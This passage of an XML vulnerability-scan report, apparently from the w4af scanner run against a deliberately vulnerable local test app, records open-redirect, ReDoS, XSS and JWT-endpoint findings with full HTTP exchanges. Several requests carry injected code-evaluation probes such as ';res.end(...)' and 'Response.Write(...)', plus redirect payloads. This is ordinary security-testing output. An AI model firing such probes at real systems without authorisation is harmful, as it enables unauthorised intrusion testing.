            <header field="Date" content="Wed, 20 Mar 2024 17:08:27 GMT" />
            <header field="Content-Length" content="0" />
            <header field="Connection" content="keep-alive" />
            <header field="Location" content="localhost@w4af.net" />
        </headers>
        <body content-encoding="base64"></body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[4786]" method="GET" name="Insecure redirection" plugin="global_redirect" severity="Medium" url="http://localhost/VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_4" var="returnTo">
    <description>Global redirect was found at: &quot;http://localhost/VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_4&quot;, using HTTP method GET. The sent data was: &quot;returnTo=localhost.w4af.net&quot; The modified parameter was &quot;returnTo&quot;.</description>

    <long-description>Web applications occasionally use parameter values to store the
address of the page to which the client will be redirected -- for
example: `yoursite.com/page.asp?redirect=www.yoursite.com/404.asp`

An
unvalidated redirect occurs when the client is able to modify the
affected parameter value in the request and thus control the location
of the redirection. For example, the following URL
`yoursite.com/page.asp?redirect=www.anothersite.com` will redirect to
`www.anothersite.com`.

Cyber-criminals will abuse these
vulnerabilities in social engineering attacks to get users to
unknowingly visit malicious web sites.

The tool has discovered that
the server does not validate the parameter value prior to redirecting
the client to the injected value.</long-description>
    <fix-guidance>The application should ensure that the supplied value for a redirect
is permitted. This can be achieved by performing whitelisting on the
parameter value.

The whitelist should contain a list of pages or
sites that the application is permitted to redirect users to. If the
supplied value does not match any value in the whitelist then the
server should redirect to a standard error page.</fix-guidance>
    <fix-effort>50</fix-effort>
    <references>
            <reference title="OWASP Top 10 2010" url="https://www.owasp.org/index.php/Top_10_2010-A10-Unvalidated_Redirects_and_Forwards" />
    </references>

    <http-transactions>
            <http-transaction id="4786">

    <http-request>
        <status>GET http://localhost/VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_4?returnTo=localhost.w4af.net HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 302</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:08:27 GMT" />
            <header field="Content-Length" content="0" />
            <header field="Connection" content="keep-alive" />
            <header field="Location" content="localhost.w4af.net" />
        </headers>
        <body content-encoding="base64"></body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[4858, 4878, 4899, 4906]" method="GET" name="ReDoS vulnerability" plugin="redos" severity="Medium" url="http://localhost/VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_5" var="returnTo">
    <description>ReDoS was found at: &quot;http://localhost/VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_5&quot;, using HTTP method GET. The sent data was: &quot;returnTo=%2F%0A&quot; The modified parameter was &quot;returnTo&quot;.</description>


    <http-transactions>
            <http-transaction id="4858">

    <http-request>
        <status>GET http://localhost/VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_5?returnTo=aaaaaaaaaaX%21 HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 302</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:08:28 GMT" />
            <header field="Content-Length" content="0" />
            <header field="Connection" content="keep-alive" />
            <header field="Location" content="aaaaaaaaaaX!" />
        </headers>
        <body content-encoding="base64"></body>
    </http-response>

</http-transaction>
            <http-transaction id="4878">

    <http-request>
        <status>GET http://localhost/VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_5?returnTo=aaaaaaaaaaX%21 HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 302</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:08:28 GMT" />
            <header field="Content-Length" content="0" />
            <header field="Connection" content="keep-alive" />
            <header field="Location" content="aaaaaaaaaaX!" />
        </headers>
        <body content-encoding="base64"></body>
    </http-response>

</http-transaction>
            <http-transaction id="4899">

    <http-request>
        <status>GET http://localhost/VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_5?returnTo=aaaaaaaaaaX%21 HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 302</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:08:28 GMT" />
            <header field="Content-Length" content="0" />
            <header field="Connection" content="keep-alive" />
            <header field="Location" content="aaaaaaaaaaX!" />
        </headers>
        <body content-encoding="base64"></body>
    </http-response>

</http-transaction>
            <http-transaction id="4906">

    <http-request>
        <status>GET http://localhost/VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_5?returnTo=aaaaaaaaaaX%21 HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 302</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:08:28 GMT" />
            <header field="Content-Length" content="0" />
            <header field="Connection" content="keep-alive" />
            <header field="Location" content="aaaaaaaaaaX!" />
        </headers>
        <body content-encoding="base64"></body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[4950]" method="GET" name="Insecure redirection" plugin="global_redirect" severity="Medium" url="http://localhost/VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_5" var="returnTo">
    <description>Global redirect was found at: &quot;http://localhost/VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_5&quot;, using HTTP method GET. The sent data was: &quot;returnTo=localhost%40w4af.net&quot; The modified parameter was &quot;returnTo&quot;.</description>

    <long-description>Web applications occasionally use parameter values to store the
address of the page to which the client will be redirected -- for
example: `yoursite.com/page.asp?redirect=www.yoursite.com/404.asp`

An
unvalidated redirect occurs when the client is able to modify the
affected parameter value in the request and thus control the location
of the redirection. For example, the following URL
`yoursite.com/page.asp?redirect=www.anothersite.com` will redirect to
`www.anothersite.com`.

Cyber-criminals will abuse these
vulnerabilities in social engineering attacks to get users to
unknowingly visit malicious web sites.

The tool has discovered that
the server does not validate the parameter value prior to redirecting
the client to the injected value.</long-description>
    <fix-guidance>The application should ensure that the supplied value for a redirect
is permitted. This can be achieved by performing whitelisting on the
parameter value.

The whitelist should contain a list of pages or
sites that the application is permitted to redirect users to. If the
supplied value does not match any value in the whitelist then the
server should redirect to a standard error page.</fix-guidance>
    <fix-effort>50</fix-effort>
    <references>
            <reference title="OWASP Top 10 2010" url="https://www.owasp.org/index.php/Top_10_2010-A10-Unvalidated_Redirects_and_Forwards" />
    </references>

    <http-transactions>
            <http-transaction id="4950">

    <http-request>
        <status>GET http://localhost/VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_5?returnTo=localhost%40w4af.net HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 302</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:08:29 GMT" />
            <header field="Content-Length" content="0" />
            <header field="Connection" content="keep-alive" />
            <header field="Location" content="localhost@w4af.net" />
        </headers>
        <body content-encoding="base64"></body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[10207]" method="GET" name="Cross site scripting vulnerability" plugin="xss" severity="Medium" url="http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_2" var="comment">
    <description>A Cross Site Scripting vulnerability was found at: &quot;http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_2&quot;, using HTTP method GET. The sent data was: &quot;comment=&quot; The modified parameter was &quot;comment&quot;.</description>

    <long-description>Client-side scripts are used extensively by modern web applications.
They perform from simple functions (such as the formatting of text) up
to full manipulation of client-side data and Operating System
interaction.



Cross Site Scripting (XSS) allows clients to inject arbitrary scripting
code into a request and have the server return the script to the
client in the response. This occurs because the application is taking
untrusted data (in this example, from the client) and reusing it
without performing any validation or encoding.</long-description>
    <fix-guidance>To remedy XSS vulnerabilities, it is important to never use untrusted
or unfiltered data within the code of a HTML page.

Untrusted data can originate not only form the client but potentially
a third party or previously uploaded file etc. Filtering of untrusted
data typically involves converting special characters to their HTML
entity encoded counterparts (however, other methods do exist, see
references). These special characters include:


* `&amp;`
* `&lt;`
* `&gt;`
* `&quot;`
* `'`
* `/`

An example of HTML entity encoding is converting `&lt;` to `&amp;lt;`. Although
it is possible to filter untrusted input, there are five locations
within an HTML page where untrusted input (even if it has been
filtered) should never be placed:


1. Directly in a script.
2. Inside an HTML comment.
3. In an attribute name.
4. In a tag name.
5. Directly in CSS.

Each of these locations have their own form of escaping and filtering.

_Because many browsers attempt to implement XSS protection, any manual
verification of this finding should be conducted using multiple different
browsers and browser versions._</fix-guidance>
    <fix-effort>10</fix-effort>
    <references>
            <reference title="WASC" url="http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting" />
            <reference title="Secunia" url="http://secunia.com/advisories/9716/" />
            <reference title="OWASP" url="https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet" />
    </references>

    <http-transactions>
            <http-transaction id="10207">

    <http-request>
        <status>GET http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_2?comment=ca8bl%3Cca8blca8bl--%3Eca8blca8bl%2A%2Fca8blca8bl%2A%2F%3A%28%22%27ca8blca8bl%3Aca8blca8bl%0Aca8blca8bl%22ca8blca8bl%27ca8blca8bl%60ca8blca8bl%20%3Dca8bl HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:10:00 GMT" />
            <header field="Content-Type" content="text/plain;charset=UTF-8" />
            <header field="Content-Length" content="244" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">PGRpdiBpZD0iY29tbWVudHMiPkFXdlFJUmRVQU5wVktMeXdRSHd3ZVRGaQo8L2Rpdj48ZGl2IGlkPSJjb21tZW50cyI+QVd2UUlSZFVBTnBWS0x5d1FId3dlVEZpCjwvZGl2PjxkaXYgaWQ9ImNvbW1lbnRzIj5jYThibDxjYThibGNhOGJsLS0+Y2E4YmxjYThibCovY2E4YmxjYThibCovOigiJ2NhOGJsY2E4Ymw6Y2E4YmxjYThibApjYThibGNhOGJsImNhOGJsY2E4YmwnY2E4YmxjYThibGBjYThibGNhOGJsID1jYThibDwvZGl2Pg==</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[5648]" method="GET" name="Authentication without www-authenticate header" plugin="http_auth_detect" severity="Information" url="http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1" var="None">
    <description>The resource: &quot;http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1&quot; requires authentication (HTTP Code 401) but the www-authenticate header is not present. This requires human verification.</description>


    <http-transactions>
            <http-transaction id="5648">

    <http-request>
        <status>GET http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1?JWT=fTp%3A%2F%2Fw4af.net%2F HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 401</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:08:45 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjoiZlRwOi8vdzRhZi5uZXQvIiwiaXNWYWxpZCI6ZmFsc2V9</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[5651]" method="GET" name="Authentication without www-authenticate header" plugin="http_auth_detect" severity="Information" url="http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1" var="None">
    <description>The resource: &quot;http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1&quot; requires authentication (HTTP Code 401) but the www-authenticate header is not present. This requires human verification.</description>


    <http-transactions>
            <http-transaction id="5651">

    <http-request>
        <status>GET http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1?JWT=%2F%2Fw4af.net HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 401</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:08:45 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjoiLy93NGFmLm5ldCIsImlzVmFsaWQiOmZhbHNlfQ==</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[5652]" method="GET" name="Authentication without www-authenticate header" plugin="http_auth_detect" severity="Information" url="http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1" var="None">
    <description>The resource: &quot;http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1&quot; requires authentication (HTTP Code 401) but the www-authenticate header is not present. This requires human verification.</description>


    <http-transactions>
            <http-transaction id="5652">

    <http-request>
        <status>GET http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1?JWT=hTtp%3A%2F%2Fw4af.net%2F HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 401</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:08:45 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjoiaFR0cDovL3c0YWYubmV0LyIsImlzVmFsaWQiOmZhbHNlfQ==</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[5654]" method="GET" name="Authentication without www-authenticate header" plugin="http_auth_detect" severity="Information" url="http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1" var="None">
    <description>The resource: &quot;http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1&quot; requires authentication (HTTP Code 401) but the www-authenticate header is not present. This requires human verification.</description>


    <http-transactions>
            <http-transaction id="5654">

    <http-request>
        <status>GET http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1?JWT=htTps%3A%2F%2Fw4af.net%2F HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 401</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:08:45 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjoiaHRUcHM6Ly93NGFmLm5ldC8iLCJpc1ZhbGlkIjpmYWxzZX0=</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[5693]" method="GET" name="Authentication without www-authenticate header" plugin="http_auth_detect" severity="Information" url="http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1" var="None">
    <description>The resource: &quot;http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1&quot; requires authentication (HTTP Code 401) but the www-authenticate header is not present. This requires human verification.</description>


    <http-transactions>
            <http-transaction id="5693">

    <http-request>
        <status>GET http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1?JWT=http%3A%2F%2Fwww.w4af.net%2F HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 401</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:08:45 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjoiaHR0cDovL3d3dy53NGFmLm5ldC8iLCJpc1ZhbGlkIjpmYWxzZX0=</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[5701]" method="GET" name="Authentication without www-authenticate header" plugin="http_auth_detect" severity="Information" url="http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1" var="None">
    <description>The resource: &quot;http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1&quot; requires authentication (HTTP Code 401) but the www-authenticate header is not present. This requires human verification.</description>


    <http-transactions>
            <http-transaction id="5701">

    <http-request>
        <status>GET http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1?JWT=Response.Write%28new%20String%28%22mgmqh%22%2C5%29%29 HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 401</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:08:46 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjoiUmVzcG9uc2UuV3JpdGUobmV3IFN0cmluZyhcIm1nbXFoXCIsNSkpIiwiaXNWYWxpZCI6ZmFsc2V9</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[5706]" method="GET" name="Authentication without www-authenticate header" plugin="http_auth_detect" severity="Information" url="http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1" var="None">
    <description>The resource: &quot;http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1&quot; requires authentication (HTTP Code 401) but the www-authenticate header is not present. This requires human verification.</description>


    <http-transactions>
            <http-transaction id="5706">

    <http-request>
        <status>GET http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1?JWT=https%3A%2F%2Fgithub.com%2Fw4af%2Fw4af HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 401</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:08:46 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjoiaHR0cHM6Ly9naXRodWIuY29tL3c0YWYvdzRhZiIsImlzVmFsaWQiOmZhbHNlfQ==</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[5708]" method="GET" name="Authentication without www-authenticate header" plugin="http_auth_detect" severity="Information" url="http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1" var="None">
    <description>The resource: &quot;http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1&quot; requires authentication (HTTP Code 401) but the www-authenticate header is not present. This requires human verification.</description>


    <http-transactions>
            <http-transaction id="5708">

    <http-request>
        <status>GET http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1?JWT=%3Bres.end%28%28new%20Array%285%2B1%29%29.join%28%27mgmqh%27%29%29 HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 401</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:08:46 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjoiO3Jlcy5lbmQoKG5ldyBBcnJheSg1KzEpKS5qb2luKCdtZ21xaCcpKSIsImlzVmFsaWQiOmZhbHNlfQ==</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[5709]" method="GET" name="Authentication without www-authenticate header" plugin="http_auth_detect" severity="Information" url="http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1" var="None">
    <description>The resource: &quot;http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1&quot; requires authentication (HTTP Code 401) but the www-authenticate header is not present. This requires human verification.</description>


    <http-transactions>
            <http-transaction id="5709">

    <http-request>
        <status>GET http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1?JWT=%3Bresponse.end%28%28new%20Array%285%2B1%29%29.join%28%27mgmqh%27%29%29 HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 401</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:08:46 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjoiO3Jlc3BvbnNlLmVuZCgobmV3IEFycmF5KDUrMSkpLmpvaW4oJ21nbXFoJykpIiwiaXNWYWxpZCI6ZmFsc2V9</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[5711]" method="GET" name="Authentication without www-authenticate header" plugin="http_auth_detect" severity="Information" url="http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1" var="None">
    <description>The resource: &quot;http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1&quot; requires authentication (HTTP Code 401) but the www-authenticate header is not present. This requires human verification.</description>


    <http-transactions>
            <http-transaction id="5711">

    <http-request>
        <status>GET http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1?JWT=hTtPs%3A%2F%2Fgithub.com%2Fw4af%2Fw4af HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 401</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:08:46 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjoiaFR0UHM6Ly9naXRodWIuY29tL3c0YWYvdzRhZiIsImlzVmFsaWQiOmZhbHNlfQ==</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[5712]" method="GET" name="Authentication without www-authenticate header" plugin="http_auth_detect" severity="Information" url="http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1" var="None">
    <description>The resource: &quot;http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1&quot; requires authentication (HTTP Code 401) but the www-authenticate header is not present. This requires human verification.</description>


    <http-transactions>
            <http-transaction id="5712">

    <http-request>
        <status>GET http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1?JWT=response.end%28%28new%20Array%285%2B1%29%29.join%28%27mgmqh%27%29%29 HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 401</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:08:46 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjoicmVzcG9uc2UuZW5kKChuZXcgQXJyYXkoNSsxKSkuam9pbignbWdtcWgnKSkiLCJpc1ZhbGlkIjpmYWxzZX0=</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[5700]" method="GET" name="Authentication without www-authenticate header" plugin="http_auth_detect" severity="Information" url="http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1" var="None">
    <description>The resource: &quot;http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1&quot; requires authentication (HTTP Code 401) but the www-authenticate header is not present. This requires human verification.</description>


    <http-transactions>
            <http-transaction id="5700">

    <http-request>
        <status>GET http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1?JWT=res.end%28%28new%20Array%285%2B1%29%29.join%28%27mgmqh%27%29%29 HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 401</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:08:46 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjoicmVzLmVuZCgobmV3IEFycmF5KDUrMSkpLmpvaW4oJ21nbXFoJykpIiwiaXNWYWxpZCI6ZmFsc2V9</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[5715]" method="GET" name="Authentication without www-authenticate header" plugin="http_auth_detect" severity="Information" url="http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1" var="None">
    <description>The resource: &quot;http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1&quot; requires authentication (HTTP Code 401) but the www-authenticate header is not present. This requires human verification.</description>


    <http-transactions>
            <http-transaction id="5715">

    <http-request>
        <status>GET http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1?JWT=github.com%2Fw4af%2Fw4af HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
